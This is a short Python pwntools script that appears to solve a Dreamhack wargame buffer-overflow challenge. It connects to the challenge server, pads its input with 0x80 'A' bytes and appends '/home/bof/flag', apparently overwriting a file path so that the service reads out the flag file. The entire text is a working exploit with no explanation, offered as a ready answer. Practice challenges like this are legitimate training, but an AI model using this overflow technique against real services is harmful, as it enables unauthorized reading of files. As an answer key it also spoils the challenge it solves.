from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 10299)

prompt = b"A" * (0x80)
prompt += b"/home/bof/flag"


p.sendlineafter("meow? ", prompt)
p.recv()
